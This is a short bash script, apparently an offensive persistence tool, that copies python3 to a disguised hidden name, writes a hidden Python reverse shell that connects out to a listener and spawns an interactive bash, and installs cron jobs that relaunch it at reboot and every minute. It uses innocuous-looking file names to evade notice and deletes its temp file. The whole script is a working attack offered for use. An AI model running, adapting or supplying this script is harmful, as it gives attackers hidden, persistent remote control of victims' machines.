#!/bin/bash

echo "[+] Enter your listener port number (e.g., ):"
read PORT

echo "[+] Enter the directory should be stored (e.g.,):"
read TARGET_DIR

LISTENER_IP=""  # <-- You can also read this via user input

# Copy Python to stealthy name
cp /usr/bin/python3 "$TARGET_DIR/.dbus-launch"

# Create the reverse shell script
cat << EOF > "$TARGET_DIR/.cored"
#!$TARGET_DIR/.dbus-launch
import socket, subprocess, os, time
while True:
  try:
    s=socket.socket()
    s.connect(("${LISTENER_IP}",${PORT}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash","-i"])
  except:
    time.sleep(60)
EOF


chmod +x "$TARGET_DIR/.cored"


crontab -l 2>/dev/null > /tmp/.fonts || true


echo "@reboot setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts
echo "* * * * * setsid nohup $TARGET_DIR/.cored >/dev/null 2>&1 &" >> /tmp/.fonts


crontab /tmp/.fonts


rm /tmp/.fonts

echo "[+] Done."
